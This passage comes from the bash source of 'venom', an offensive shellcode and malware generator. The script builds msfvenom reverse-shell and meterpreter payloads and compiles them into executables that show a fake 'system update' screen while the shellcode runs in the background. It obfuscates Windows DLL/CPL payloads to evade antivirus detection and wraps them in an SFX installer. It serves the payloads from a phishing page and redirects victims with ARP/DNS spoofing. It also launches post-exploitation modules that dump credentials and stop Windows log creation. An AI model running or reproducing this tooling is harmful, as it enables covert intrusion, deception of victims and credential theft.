2>&1\n  else\n    echo ${RedF}[x]${white} no backup msf modules found..${Reset}\n    sleep 2\n  fi\nfi\nexit\n}\n\n\n\n# -------------------------------------------------END OF SCRIPT SETTINGS------------------------------------->\n\n\n\n\n# ---------------------------------------------\n# build shellcode in C format\n# targets: Apple | BSD | LINUX | SOLARIS\n# ---------------------------------------------\nsh_shellcode1 () {\n# get user input to build shellcode\necho ${BlueF}[☠]${white} Enter shellcode settings!${Reset}\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"linux/ppc/shell_reverse_tcp\" FALSE \"linux/x86/shell_reverse_tcp\" FALSE \"linux/x86/meterpreter/reverse_tcp\" FALSE \"linux/x64/shell/reverse_tcp\" FALSE \"linux/x64/shell_reverse_tcp\" FALSE \"linux/x64/meterpreter/reverse_tcp\" FALSE \"osx/armle/shell_reverse_tcp\" FALSE \"osx/ppc/shell_reverse_tcp\" FALSE \"osx/x64/shell_reverse_tcp\" FALSE \"bsd/x86/shell/reverse_tcp\" FALSE \"bsd/x64/shell_reverse_tcp\" FALSE \"solaris/x86/shell_reverse_tcp\" --width 350 --height 460) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: shellcode\" --width 300) > /dev/null 2>&1\necho ${BlueF}[☠]${white} editing/backup files...${Reset};\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"shellcode\";fi\n\n\necho \"${BlueF}[☠]${white} Building shellcode -> C format ...\"${Reset};\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    NAME    : $N4m\n    FORMAT  : C -> UNIX\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw\"\necho \"\"\n# display generated shelcode\ncat $IPATH/output/chars.raw\necho \"\"\nsleep 2\n# parsing shellcode data\ncmd=$(cat $IPATH/output/chars.raw | grep -v \"=\")\n\n\n   # check if all dependencies needed are installed\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"${BlueF}[☠]${white} chars.raw -> found!\"${Reset};\n      sleep 2 \n   else\n      echo \"${RedF}[x]${white} chars.raw -> not found!\"${Reset};\n      exit\n   fi\n\n   # check if gcc exists\n   audit=`which gcc`> /dev/null 2>&1\n   if [ \"$?\" -eq \"0\" ]; then\n      echo \"${BlueF}[☠]${white} gcc compiler -> found!\"${Reset};\n      sleep 2\n   else\n      echo \"${RedF}[x]${white} gcc compiler -> not found!\"${Reset};\n      echo \"${BlueF}[☠]${white} Download compiler -> apt-get install gcc\"${Reset};\n      echo \"\"\n      sudo apt-get install gcc\n      echo \"\"\n   fi\n\n\n## EDITING/BACKUP FILES NEEDED\ncp $InJEc $IPATH/templates/exec[bak].c\n\n\n# -----------------\n# BUILD C TEMPLATE\n# -----------------\necho \"#include<stdio.h>\" > $IPATH/output/exec.c\necho \"#include<stdlib.h>\" >> $IPATH/output/exec.c\necho \"#include<string.h>\" >> $IPATH/output/exec.c\necho \"#include<sys/types.h>\" >> $IPATH/output/exec.c\necho \"#include<sys/wait.h>\" >> $IPATH/output/exec.c\necho \"#include<unistd.h>\" >> $IPATH/output/exec.c\necho \"\" >> $IPATH/output/exec.c\necho \"/*\" >> $IPATH/output/exec.c\necho \"Author: r00t-3xp10it\" >> $IPATH/output/exec.c\necho \"Framework: venom v1.0.17\" >> $IPATH/output/exec.c\necho \"gcc -fno-stack-protector -z execstack exec.c -o $N4m\" >> $IPATH/output/exec.c\necho \"*/\" >> $IPATH/output/exec.c\necho \"\" >> $IPATH/output/exec.c\necho \"/* msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c */\" >> $IPATH/output/exec.c\necho \"unsigned char kungfu[] =\" >> $IPATH/output/exec.c\necho \"$cmd\" >> $IPATH/output/exec.c\necho \"\" >> $IPATH/output/exec.c\necho \"int main()\" >> $IPATH/output/exec.c\necho \"{\" >> $IPATH/output/exec.c\necho \"/*\" >> $IPATH/output/exec.c\necho \"This fork(); function allow us to spawn a new child process (in background). This way i can\" >> $IPATH/output/exec.c\necho \"execute shellcode in background while continue the execution of the C program in foreground.\" >> $IPATH/output/exec.c\necho \"Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c\" >> $IPATH/output/exec.c\necho \"*/\" >> $IPATH/output/exec.c\necho \"fflush(NULL);\" >> $IPATH/output/exec.c\necho \"int pid = fork();\" >> $IPATH/output/exec.c\necho \"   if (pid > 0) {\" >> $IPATH/output/exec.c\necho \"      /* We are running in parent process (as foreground job). */\" >> $IPATH/output/exec.c\necho \"      printf(\\\"Please Wait, Updating system ..\\\\\\n\\\\\\n\\\");\" >> $IPATH/output/exec.c\necho \"      /* Display system information onscreen to target user */\" >> $IPATH/output/exec.c\necho \"      sleep(1);system(\\\"h=\\$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \\\\\\\"Hostname   :\\$h\\\\\\\"\\\");\" >> $IPATH/output/exec.c\necho \"      system(\\\"k=\\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\\\\\"Kernel     :\\$k\\\\\\\"\\\");\" >> $IPATH/output/exec.c\necho \"      system(\\\"b=\\$(hostnamectl | grep 'Boot' | cut -d ':' -f2);echo \\\\\\\"Boot ID    :\\$b\\\\\\\"\\\");\" >> $IPATH/output/exec.c\necho \"      sleep(2);printf(\\\"\\\\\\n\\\");\" >> $IPATH/output/exec.c\necho \"      system(\\\"OP=\\$(hostnamectl | grep 'Operating' | awk {'print \\$3'});echo \\\\\\\"Hit:1 http://\\$OP.download/\\$OP \\$OP-rolling/contrib\\\\\\\"\\\");\" >> $IPATH/output/exec.c\necho \"      printf(\\\"------------------------------------------------------\\\\\\n\\\");\" >> $IPATH/output/exec.c\necho \"      sleep(1);system(\\\"for i in 1023.8353.9354:/daemon 7384.8400.8112:/etc/apt 3305.6720.2201:/etc/bin 6539.3167.1200:/etc/cron 4739.0473.4370:/etc/systemd 9164.0257.0034:/etc/passwd 1023.2559.0076:/etc/crontab 3945.4401.5037:/etc/fork.sys 4406.4490.2320:/etc/drive.sys 1288.3309.9955:/etc/PSmanager 1992.9909.1234:/etc/synaptic 4856.4845.6677:/etc/sources.list 4400.0079.0001:/etc/shadow;do dt=\\$(date|awk {'print \\$4,\\$5,\\$6'});echo \\\\\\\"\\$dt - PATCHING: \\$i\\\\\\\" && sleep 1;done\\\");\" >> $IPATH/output/exec.c\necho \"      printf(\\\"------------------------------------------------------\\\\\\n\\\");\" >> $IPATH/output/exec.c\necho \"      printf(\\\"Please Wait, finishing update process ..\\\\\\n\\\");\" >> $IPATH/output/exec.c\necho \"      sleep(2);printf(\\\"Done...\\\\\\n\\\");\" >> $IPATH/output/exec.c\necho \"   }\" >> $IPATH/output/exec.c\necho \"   else if (pid == 0) {\" >> $IPATH/output/exec.c\necho \"      /* We are running in child process (as backgrond job - orphan). */\" >> $IPATH/output/exec.c\necho \"      setsid();\" >> $IPATH/output/exec.c\necho \"      void (*ret)() = (void(*)())kungfu;\" >> $IPATH/output/exec.c\necho \"      ret();\" >> $IPATH/output/exec.c\necho \"  } return 0;\" >> $IPATH/output/exec.c\necho \"}\" >> $IPATH/output/exec.c\n\n\ncd $IPATH/templates\n# COMPILING SHELLCODE USING GCC\necho \"${BlueF}[☠]${white} Compiling using gcc...\"${Reset};\ngcc -fno-stack-protector -z execstack $IPATH/output/exec.c -o $IPATH/output/$N4m\n\n\n## CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m\\n\\nExecute: sudo ./$N4m\\n\\nchose how to deliver: $N4m\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 350 --height 305) > /dev/null 2>&1\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};\n      echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};\n      echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};\n        if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log  \n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n        fi\n      sleep 2\n\n   else\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"linux_hostrecon.rc\" FALSE \"dump_credentials_linux.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 260) > /dev/null 2>&1\n\n\nif [ \"$P0\" = \"dump_credentials_linux.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/wifi_dump_linux.rb\" ]; then\n    echo ${GreenF}[✔]${white} wifi_dump_linux.rb -> found${Reset};\n    sleep 2\n  else\n    echo ${RedF}[x]${white} wifi_dump_linux.rb -> not found${Reset};\n    sleep 1\n    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};\n    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1\n    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\n\nelif [ \"$P0\" = \"linux_hostrecon.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/linux_hostrecon.rb\" ]; then\n    echo ${GreenF}[✔]${white} linux_hostrecon.rb -> found${Reset};\n    sleep 2\n  else\n    echo ${RedF}[x]${white} linux_hostrecon.rb -> not found${Reset};\n    sleep 1\n    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};\n    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1\n    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\n\nelse\n\necho \"nothing to do here\" > /dev/null 2>&1\n\nfi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      # copy from output\n      cd $IPATH/output\n      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1\n      echo \"${BlueF}[☠]${white} loading -> Apache2Server!\"${Reset};\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m $ApAcHe/$N4m\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};\n        echo ${BlueF}[☠]${white} Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};\n        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};\n          if [ \"$MsFlF\" = \"ON\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};\n        echo ${BlueF}[☠]${white} Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};\n        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\n\n## CLEANING EVERYTHING UP\necho ${BlueF}[☠]${white} Cleanning temp generated files...${Reset};\nmv $IPATH/templates/exec[bak].c $InJEc\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\nsh_menu\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_menu\n  clear\nfi\n}\n\n\n\n\n# -----------------------------------------------------------------\n# build shellcode in DLL format (windows-platforms)\n# mingw32 obfustated using astr0baby method and build installer.bat\n# to use in winrar/sfx 'make payload executable by pressing on it'\n# -----------------------------------------------------------------\nsh_shellcode2 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 350) > /dev/null 2>&1\n# input agent final name\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: astr0baby\" --width 300) > /dev/null 2>&1\n# chose agent final extension (.dll or .cpl)\nExt=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable agent extensions:\\nThere is a niftty trick involving dll loading behavior under windows.\\nIf we rename our agent.dll to agent.cpl we now have an executable\\nmeterpreter payload that we cant doubleclick and launch it..\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"$N4m.dll\" FALSE \"$N4m.cpl\" --width 300 --height 150) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"astr0baby\";fi\nif [ \"$Ext\" = \"$N4m.dll\" ]; then\n   Ext=\"dll\"\nelse\n   Ext=\"cpl\"\nfi\n\n\necho \"[☠] Loading uuid(@nullbyte) obfuscation module ..\"\nsleep 1\necho \"[☠] Building shellcode -> C format ...\"\nsleep 2\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\n\necho \"\" > $IPATH/output/chars.raw\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : C -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw\"\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw\"\nfi\n\n\necho \"\"\n# display generated shelcode\ncat $IPATH/output/chars.raw\necho \"\" && echo \"\"\nsleep 2\n\n   # check if all dependencies needed are installed\n   # check if template exists\n   if [ -e $InJEc5 ]; then\n      echo \"[☠] exec_dll.c -> found!\"\n      sleep 2\n   else\n      echo \"[☠] exec_dll.c -> not found!\"\n      exit\n   fi\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n   # check if mingw32 exists\n   audit=`which $ComP`> /dev/null 2>&1\n   if [ \"$?\" -eq \"0\" ]; then\n      echo \"[☠] mingw32 compiler -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] mingw32 compiler -> not found!\"\n      echo \"[☠] Download compiler -> apt-get install mingw32\"\n      echo \"\"\n      sudo apt-get install mingw32\n      echo \"\"\n      fi\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files...\"\ncp $InJEc5 $IPATH/templates/exec_dll[bak].c\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\n\ncd $IPATH/templates\n# use SED to replace IpADr3 and P0rT\necho \"[☠] Injecting shellcode -> $N4m.dll!\"\nsleep 2\nsed -i \"s|IpADr3|$lhost|g\" exec_dll.c\nsed -i \"s|P0rT|$lport|g\" exec_dll.c\n\n# obfuscation ??\nUUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 150 | head -n 1)\nsed -i \"s|UUID-RANDOM|$UUID_1|g\" exec_dll.c\n\n\n\n\necho \"[✔] Using random UUID keys (evade signature detection)\"\nsleep 2\necho \"\"\necho \"    Generated key:$UUID_1\"\necho \"\"\nsleep 1\n\n\n\nif [ \"$Ext\" = \"dll\" ]; then\n  # build winrar-SFX installer.bat script\n  echo \"[☠] Building winrar/SFX -> installer.bat...\"\n  sleep 2\n  echo \":: SFX auxiliary | Author: r00t-3xp10it\" > $IPATH/output/installer.bat\n  echo \":: this script will run payload using rundll32\" >> $IPATH/output/installer.bat\n  echo \":: ---\" >> $IPATH/output/installer.bat\n  echo \"@echo off\" >> $IPATH/output/installer.bat\n  echo \"echo [*] Please wait, preparing software ...\" >> $IPATH/output/installer.bat\n  echo \"rundll32.exe $N4m.dll,main\" >> $IPATH/output/installer.bat\n  echo \"exit\" >> $IPATH/output/installer.bat\n  sleep 2\nfi\n\n\n# COMPILING SHELLCODE USING mingw32\necho \"[☠] Compiling/obfuscating using mingw32...\"\nsleep 2\n# special thanks to astr0baby for mingw32 -lws2_32 -shared (dll) flag :D\n$ComP exec_dll.c -o $N4m.dll -lws2_32 -shared\nstrip $N4m.dll\n\nif [ \"$Ext\" = \"dll\" ]; then\n   mv $N4m.dll $IPATH/output/$N4m.dll\nelse\n   mv $N4m.dll $IPATH/output/$N4m.cpl\nfi\n\n\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nif [ \"$Ext\" = \"dll\" ]; then\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.dll\\n$IPATH/output/installer.bat\\n\\nExecute on cmd: rundll32.exe $N4m.dll,main\\n\\nchose how to deliver: $N4m.dll\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 260) > /dev/null 2>&1\nelse\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.cpl\\n\\nchose how to deliver: $N4m.cpl\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 260) > /dev/null 2>&1\nfi\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n\n          if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          fi\n        fi\n      sleep 2\n\n\n   else\n\n\n      # user settings\n      if [ \"$Ext\" = \"dll\" ]; then\n      N4m2=$(zenity --title=\"☠ SFX Infection ☠\" --text \"WARNING BEFOR CLOSING THIS BOX:\\n\\nTo use SFX attack vector: $N4m.dll needs to be\\ncompressed together with installer.bat into one SFX\\n\\n1º compress the two files into one SFX\\n2º store SFX into shell/output folder\\n3º write the name of the SFX file\\n4º press OK to continue...\\n\\nExample:output.exe\" --entry --width 360) > /dev/null 2>&1\n      else\n      N4m2=\"$N4m.$Ext\"\n      fi\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 310) > /dev/null 2>&1\n\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\nfi\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed 